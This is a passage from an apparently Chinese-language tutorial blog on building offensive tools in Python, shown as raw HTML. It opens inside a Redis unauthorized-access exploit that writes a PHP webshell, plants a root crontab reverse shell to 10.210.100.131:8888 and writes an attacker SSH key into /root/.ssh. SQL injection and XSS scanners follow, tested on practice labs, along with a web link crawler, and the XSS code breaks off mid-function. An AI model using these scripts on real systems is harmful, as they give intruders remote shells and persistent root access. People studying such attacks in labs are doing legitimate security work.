class="hljs-string">&#x27;/&#x27;</span> + suf<br>                redis_client.config_set(<span class="hljs-string">&#x27;dir&#x27;</span>,root)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span>(e)<br>                <span class="hljs-keyword">continue</span><br>            roots.append(root)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> roots:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-]未找到目标主机的web路径&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+]找到目标主机的web路径：%s&#x27;</span>%<span class="hljs-built_in">str</span>(roots))<br>    <span class="hljs-keyword">return</span> roots<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_web</span>():<br>    url = <span class="hljs-string">&#x27;http://10.210.100.131/shell.php&#x27;</span><br>    response = requests.get(url)<br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment">#1.写webshell</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp_webshell</span>(<span class="hljs-params">redis_client</span>):<br>    <span class="hljs-comment">#1.找到web服务器的根目录</span><br>    <span class="hljs-comment">#root = &quot;/var/www/html&quot;</span><br>    roots = get_webroot(redis_client)<br>    <span class="hljs-comment">#2.写入木马文件</span><br>    <span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> roots:<br>        redis_client.config_set(<span class="hljs-string">&#x27;dir&#x27;</span>,root)<br>        redis_client.config_set(<span class="hljs-string">&#x27;dbfilename&#x27;</span>,<span class="hljs-string">&#x27;shell.php&#x27;</span>)<br>        redis_client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>)<br>        redis_client.save()<br>    test = test_web()<br>    <span class="hljs-keyword">if</span> test:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;webshell已写入成功&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;webshell写入失败&quot;</span>)<br><span class="hljs-comment">#2.创建定时任务反弹shell</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp_crontab</span>(<span class="hljs-params">redis_client</span>):<br>    <span class="hljs-comment">#1.找到定时任务的目录</span><br>    root = <span class="hljs-string">&quot;/var/spool/cron&quot;</span><br>    <span class="hljs-comment">#2.写入定时任务</span><br>    redis_client.config_set(<span class="hljs-string">&#x27;dir&#x27;</span>,root)<br>    redis_client.config_set(<span class="hljs-string">&#x27;dbfilename&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>)<br>    redis_client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;\n* * * * * bash -i &gt;&amp; /dev/tcp/10.210.100.131/8888 0&gt;&amp;1\n&#x27;</span>)<br>    redis_client.save()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;定时任务已经创建&quot;</span>)<br><br><span class="hljs-comment">#3.写入攻击机公钥</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp_ssh</span>(<span class="hljs-params">redis_client,ip</span>):<br>    <span class="hljs-comment">#1.找到根目录下的密钥文件</span><br>    root = <span class="hljs-string">&quot;/root/.ssh&quot;</span><br>    <span class="hljs-comment">#2.向靶机中写入公钥</span><br>    redis_client.config_set(<span class="hljs-string">&#x27;dir&#x27;</span>,root)<br>    redis_client.config_set(<span class="hljs-string">&#x27;dbfilename&#x27;</span>,<span class="hljs-string">&#x27;authorized_key&#x27;</span>)<br>    redis_client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;\n\n&#x27;</span>+sshkey+<span class="hljs-string">&#x27;\n\n&#x27;</span>)<br>    redis_client.save()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;免密登录已设置&quot;</span>)<br>    connect_ssh(ip)<br><br><span class="hljs-comment">#ssh连接  注意：ssh连接要在生成公钥的攻击机上执行</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect_ssh</span>(<span class="hljs-params">ip</span>):<br>    ssh = paramiko.SSHClient()<br>    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>    <span class="hljs-keyword">try</span>:<br>        ssh.connect(ip,<span class="hljs-number">22</span>,<span class="hljs-string">&#x27;root&#x27;</span>,sshkey)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ssh 连接成功&#x27;</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;连接失败&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    scan_port(<span class="hljs-string">&quot;10.210.100.131&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231127162148682.png" alt="image-20231127162148682"> </p><h2 id="sql注入扫描"><a href="#sql注入扫描" class="headerlink" title="sql注入扫描"></a>sql注入扫描</h2><p>1.sql注入的原理是，判断有无后面我们自己输入的被带入sql语句执行<br>2.常见就是 ‘ “ and 1&#x3D;1  &#x2F; and 1&#x3D;2等<br>3.看网页的反应，有没有报错，或者通过时间等猜测是否带入我们输入的参数</p><p>sql注入的核心是用户输入，所以要先提取网页的表单</p><p>待优化  </p><p>1.测试报错的语句可以定义多个</p><p>2.可添加爬虫</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><span class="hljs-keyword">from</span> fake_useragent <span class="hljs-keyword">import</span> UserAgent<br><br>ua = UserAgent()<br>s = requests.session()<br>s.headers[<span class="hljs-string">&quot;User-Agent&quot;</span>] = ua.random<br><br><span class="hljs-comment">#获取网页表单</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_all_forms</span>(<span class="hljs-params">url</span>):<br>    soup = BeautifulSoup(s.get(url).content,<span class="hljs-string">&#x27;lxml&#x27;</span>)<br>    <span class="hljs-keyword">return</span> soup.find_all(<span class="hljs-string">&quot;form&quot;</span>)<br><br><span class="hljs-comment">#解析表单  提取关于html表单的有用信息</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_form_details</span>(<span class="hljs-params">form</span>):<br>    details = &#123;&#125;   <span class="hljs-comment">#字典，存储表单信息的键值对</span><br>    <span class="hljs-comment">#获取表单的action</span><br>    <span class="hljs-keyword">try</span>:<br>        action = form.attrs.get(<span class="hljs-string">&quot;action&quot;</span>).lower()<br>    <span class="hljs-keyword">except</span>:<br>        action = <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#获取表单的方法 (get post)</span><br>    method = form.attrs.get(<span class="hljs-string">&quot;method&quot;</span>).lower()<br>    <span class="hljs-comment">#获取一些输入的细节,比如类型 名称等</span><br>    inputs = []<br>    <span class="hljs-comment">#列表的元素为字典</span><br>    <span class="hljs-keyword">for</span> input_tag <span class="hljs-keyword">in</span> form.find_all(<span class="hljs-string">&quot;input&quot;</span>):<br>        input_type = input_tag.attrs.get(<span class="hljs-string">&quot;type&quot;</span>,<span class="hljs-string">&quot;text&quot;</span>)<br>        input_name = input_tag.attrs.get(<span class="hljs-string">&quot;name&quot;</span>)<br>        input_value = input_tag.attrs.get(<span class="hljs-string">&quot;value&quot;</span>)<br>        inputs.append(&#123;<span class="hljs-string">&quot;type&quot;</span>:input_type,<span class="hljs-string">&quot;name&quot;</span>:input_name,<span class="hljs-string">&quot;value&quot;</span>:input_value&#125;)<br>    details[<span class="hljs-string">&#x27;action&#x27;</span>] = action<br>    details[<span class="hljs-string">&#x27;method&#x27;</span>] = method<br>    details[<span class="hljs-string">&#x27;inputs&#x27;</span>] = inputs<br>    <span class="hljs-keyword">return</span> details<br><br><span class="hljs-comment">#判断是否存在注入</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_vulnerable</span>(<span class="hljs-params">response</span>):<br>    errors = &#123;<br>        <span class="hljs-comment">#mysql</span><br>        <span class="hljs-string">&quot;You have an error in your SQL syntax&quot;</span>,<br>        <span class="hljs-string">&quot;warning:mysql&quot;</span>,<br>        <span class="hljs-comment">#sqlserver</span><br>        <span class="hljs-string">&quot;unclosed quotation mark after the charcter string&quot;</span>,<br>        <span class="hljs-comment">#Oracle</span><br>        <span class="hljs-string">&quot;qupted string not properly terminated&quot;</span>,<br>    &#125;<br>    <span class="hljs-keyword">for</span> error <span class="hljs-keyword">in</span> errors:<br>        <span class="hljs-keyword">if</span> error <span class="hljs-keyword">in</span> response.content.decode():<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_sql_injection</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment">#1.测试url</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;\&quot;&#x27;&quot;</span>:<br>        new_url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span><span class="hljs-subst">&#123;c&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在尝试&quot;</span>,new_url)<br>        res = s.get(new_url)<br>        <span class="hljs-keyword">if</span> is_vulnerable(res):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;可能存在sql注入漏洞,链接：%s&quot;</span>%new_url)<br>            <span class="hljs-keyword">return</span> <br>    <span class="hljs-comment">#2.测试表单</span><br>    forms = get_all_forms(url)<br>    <span class="hljs-keyword">for</span> form <span class="hljs-keyword">in</span> forms:<br>        form_details =  get_form_details(form)<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;\&quot;&#x27;&quot;</span>:<br>            <span class="hljs-comment">#提交测试数据体</span><br>            data = &#123;&#125;<br>            <span class="hljs-keyword">for</span> input_tag <span class="hljs-keyword">in</span> form_details[<span class="hljs-string">&quot;inputs&quot;</span>]:<br>                <span class="hljs-comment">#测试任何隐藏的或者有值的输入</span><br>                <span class="hljs-keyword">if</span> input_tag[<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-keyword">or</span> input_tag[<span class="hljs-string">&quot;value&quot;</span>]:<br>                    <span class="hljs-comment">#只需要在表单的主体中使用</span><br>                    <span class="hljs-keyword">try</span>:<br>                        data[input_tag[<span class="hljs-string">&quot;name&quot;</span>]] = input_tag[<span class="hljs-string">&quot;value&quot;</span>] + c<br>                    <span class="hljs-keyword">except</span>:<br>                        <span class="hljs-keyword">pass</span><br>                <span class="hljs-keyword">elif</span> input_tag[<span class="hljs-string">&quot;type&quot;</span>] != <span class="hljs-string">&quot;submit&quot;</span>:<br>                    <span class="hljs-comment">#除了submit标签其他标签全部加上测试字符</span><br>                    data[input_tag[<span class="hljs-string">&quot;name&quot;</span>]] = <span class="hljs-string">f&quot;test<span class="hljs-subst">&#123;c&#125;</span>&quot;</span><br>        <span class="hljs-comment">#拼接url</span><br>        url = urljoin(url,form_details[<span class="hljs-string">&quot;action&quot;</span>])<br>        <span class="hljs-keyword">if</span> form_details[<span class="hljs-string">&quot;method&quot;</span>] == <span class="hljs-string">&quot;post&quot;</span>:<br>            res = s.post(url,data=data)<br>        <span class="hljs-keyword">elif</span> form_details[<span class="hljs-string">&quot;method&quot;</span>] == <span class="hljs-string">&quot;get&quot;</span>:<br>            res = s.get(url,params=data)<br>        <span class="hljs-keyword">if</span> is_vulnerable(res):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;可能存在sql注入漏洞,链接：%s&quot;</span>%new_url)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Form:&quot;</span>)<br>            <span class="hljs-built_in">print</span>(form_details)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    url = <span class="hljs-string">&quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;</span><br>    scan_sql_injection(url)<br><br></code></pre></td></tr></table></figure><p>get型注入  sqli第1关</p><p><img src="/img/image-20231127174905644.png" alt="image-20231127174905644"> </p><p>post型注入  sqli第11关</p><p><img src="/img/image-20231127175008293.png" alt="image-20231127175008293"></p><h2 id="链接提取器"><a href="#链接提取器" class="headerlink" title="链接提取器"></a>链接提取器</h2><p>原理：找a标签下的href属性</p><p>步骤：</p><p>1.解析网页（bs  xpath  re）</p><p>2.通过解析器的方法找到对应的属性</p><p>3.形如这种：href&#x3D;”&#x2F;feedback?type&#x3D;5” ，需要拼接成完整的路径（使用urljoin）</p><p>4.分辨是外链还是内链  存到响应的集合中</p><p>5.递归爬取，将结果保存</p><p>整体代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin,urlparse<br><span class="hljs-keyword">from</span> fake_useragent <span class="hljs-keyword">import</span> UserAgent<br><span class="hljs-keyword">import</span> logging<br><br><span class="hljs-comment">#内链  使用集合可以自动去重</span><br>internal_urls = <span class="hljs-built_in">set</span>()<br><span class="hljs-comment">#外链</span><br>external_urls = <span class="hljs-built_in">set</span>()<br>total_urls_visited = <span class="hljs-number">0</span><br><br><span class="hljs-comment">#检查url是否有效</span><br><span class="hljs-comment">#urlparse解析url 协议(scheme) 网络位置(netloc) 路径(path) 查询参数(query)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_valid</span>(<span class="hljs-params">url</span>):<br>    parsed = urlparse(url)<br>    loc = <span class="hljs-built_in">bool</span>(parsed.netloc)<br>    sche = <span class="hljs-built_in">bool</span>(parsed.scheme)<br>    <span class="hljs-keyword">return</span> loc <span class="hljs-keyword">and</span> sche<br><br><span class="hljs-comment">#解析网页</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_allwebsite_links</span>(<span class="hljs-params">url</span>):<br>    urls = <span class="hljs-built_in">set</span>()    <span class="hljs-comment">#只存内部链接，方便后面递归时爬取的是内链</span><br>    <span class="hljs-comment">#提取域名，用来判断是内链还是外链</span><br>    domain_name = urlparse(url).netloc<br>    <span class="hljs-comment">#解析网页</span><br>    soup = BeautifulSoup(requests.get(url).content,<span class="hljs-string">&#x27;lxml&#x27;</span>)<br>    <span class="hljs-comment">#获取所有的a标签</span><br>    <span class="hljs-keyword">for</span> a_tag <span class="hljs-keyword">in</span> soup.find_all(<span class="hljs-string">&quot;a&quot;</span>):<br>        <span class="hljs-comment">#提取href属性的值</span><br>        href = a_tag.attrs.get(<span class="hljs-string">&quot;href&quot;</span>)<br>        <span class="hljs-keyword">if</span> href == <span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">or</span> href <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        href = urljoin(url,href)<br>        <span class="hljs-comment">#剔除get请求后的参数</span><br>        parsed_href = urlparse(href)<br>        href = parsed_href.scheme + <span class="hljs-string">&quot;://&quot;</span> + parsed_href.netloc + parsed_href.path<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_valid(href):<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> href <span class="hljs-keyword">in</span> internal_urls:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-comment">#判断是否为外链</span><br>        <span class="hljs-keyword">if</span> domain_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> href:<br>            <span class="hljs-keyword">if</span> href <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> external_urls:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;外部链接：<span class="hljs-subst">&#123;href&#125;</span>&quot;</span>)<br>                external_urls.add(href)<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;内部链接：<span class="hljs-subst">&#123;href&#125;</span>&quot;</span>)<br>        urls.add(href)<br>        internal_urls.add(href)<br>    <span class="hljs-keyword">return</span> urls <br><br><span class="hljs-comment">#如果要爬取整个网站，需要进行递归</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crawl</span>(<span class="hljs-params">url,max_url=<span class="hljs-number">15</span></span>):<br>    <span class="hljs-keyword">global</span> total_urls_visited<br>    total_urls_visited += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;正在爬取:<span class="hljs-subst">&#123;url&#125;</span>&quot;</span>)<br>    links = get_allwebsite_links(url)<br>    <span class="hljs-keyword">for</span> link <span class="hljs-keyword">in</span> links:<br>        <span class="hljs-keyword">if</span> total_urls_visited &gt; max_url:<br>            <span class="hljs-keyword">break</span><br>        crawl(link,max_url=max_url)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    url = <span class="hljs-string">&quot;https://zhihu.com&quot;</span><br>    domain_name = urlparse(url).netloc<br>    crawl(url=url,max_url=<span class="hljs-number">15</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;总内部链接数：&quot;</span>,<span class="hljs-built_in">len</span>(internal_urls))<br>    <span class="hljs-built_in">print</span>(internal_urls)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;总外部链接数：&quot;</span>,<span class="hljs-built_in">len</span>(external_urls))    <br>    <span class="hljs-built_in">print</span>(external_urls)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;domain_name&#125;</span>的内部链接爬取结果.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> internal_url <span class="hljs-keyword">in</span> internal_urls:<br>            <span class="hljs-built_in">print</span>(internal_url.strip(),file=f)<br>    <br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;domain_name&#125;</span>的外部链接爬取结果.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> external_url <span class="hljs-keyword">in</span> external_urls:<br>            <span class="hljs-built_in">print</span>(external_url.strip(),file=f)<br><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231127230243145.png" alt="image-20231127230243145"></p><p><img src="/img/image-20231127230318426.png" alt="image-20231127230318426"></p><p>区分内链和外链的作用：可能可以用于供应链打击</p><h2 id="XSS扫描器"><a href="#XSS扫描器" class="headerlink" title="XSS扫描器"></a>XSS扫描器</h2><p>1.看到输入框就fuzz</p><p>2.观察网页是否存在回显</p><p>3.判断网页是否执行了js语句</p><p>4.整合xss payload</p><p>以xss-lab为例，将payload插入到输入的表单中</p><p><img src="/img/image-20231128100936485.png" alt="image-20231128100936485"> </p><p>整体代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_all_forms</span>(<span class="hljs-params">url</span>):<br>    soup = BeautifulSoup(requests.get(url).content,<span class="hljs-string">&quot;lxml&quot;</span>)<br>    <span class="hljs-comment">#拿到页面中的所有form表单</span><br>    <span class="hljs-keyword">return</span> soup.find_all(<span class="hljs-string">&quot;form&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_form_details</span>(<span class="hljs-params">form</span>):<br>    <span class="hljs-comment">#定义一个存储表单详细信息的字典</span><br>    details = &#123;&#125;<br>    action = form.attrs.get(<span class="hljs-string">&quot;action&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).lower()<br>    <span class="hljs-comment">#获取表单的提交方法</span><br>    method = form.attrs.get(<span class="hljs-string">&quot;method&quot;</span>,<span class="hljs-string">&quot;get&quot;</span>).lower()<br>    <br>    inputs = []<br>    <span class="hljs-keyword">for</span> input_tag <span class="hljs-keyword">in</span> form.find_all(<span class="hljs-string">&quot;input&quot;</span>):<br>        <span class="hljs-comment">#soup.attrs.get(name, default=None)</span><br>        <span class="hljs-comment">#其中，name 是要获取的属性名称，default 是可选的默认值，如果未找到指定属性，则返回该默认值。</span><br>        <span class="hljs-comment">#注意：这里将没有tyoe属性的input标签的type都设置为了text</span><br>        input_type = input_tag.attrs.get(<span class="hljs-string">&quot;type&quot;</span>,<span class="hljs-string">&quot;text&quot;</span>)<br>        input_name = input_tag.attrs.get(<span class="hljs-string">&quot;name&quot;</span>)<br>        inputs.append(&#123;<span class="hljs-string">&quot;type&quot;</span>:input_type,<span class="hljs-string">&quot;name&quot;</span>:input_name&#125;)<br><br>    <span class="hljs-comment">#将所有的信息添加到结果字典中</span><br>    details[<span class="hljs-string">&quot;action&quot;</span>] = action<br>    details[<span class="hljs-string">&quot;method&quot;</span>] = method<br>    details[<span class="hljs-string">&quot;inputs&quot;</span>] = inputs<br>    <span class="hljs-keyword">return</span> details<br><br><span class="hljs-comment">#根据表单信息提交参数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit_form</span>(<span class="hljs-params">form_details,url,value</span>):<br>    target_url = urljoin(url,form_details[<span class="hljs-string">&quot;action&quot;</span>])<br>    <span class="hljs-comment">#获取输入元素然后进行替换为xsspayload</span><br>    inputs = form_details[<span class="hljs-string">&quot;inputs&quot;</span>]<br>    data = &#123;&#125;<br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">input</span> <span class="hljs-keyword">in</span> inputs:<br>        <span class="hljs-comment">#替换所有文本框的值和搜索框的值</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">input</span>[<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;text&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">input</span>[<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;search&quot;</span>:<br>            <span class="hljs-built_in">input</span>[<span class="hljs-string">&quot;value&quot;</span>] = value<br>        input_name = <span class="hljs-built_in">input</span>.get(<span class="hljs-string">&quot;name&quot;</span>)<br>        input_value = <span class="hljs-built_in">input</span>.get(<span class="hljs-string">&quot;value&quot;</span>)<br>       <br>        <span class="hljs-keyword">if</span> input_name <span class="hljs-keyword">and</span> input_value:<br>            <span class="hljs-comment">#如果都不为空 则添加</span><br>            data[input_name] = input_value<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;正在向<span class="hljs-subst">&#123;target_url&#125;</span>提交payload&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;数据：<span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">if</span> form_details[<span class="hljs-string">&quot;method&quot;</span>] == <span class="hljs-string">&quot;post&quot;</span>:<br>        <span class="hljs-keyword">return</span> requests.post(url=target_url,data=data)<br>    <span 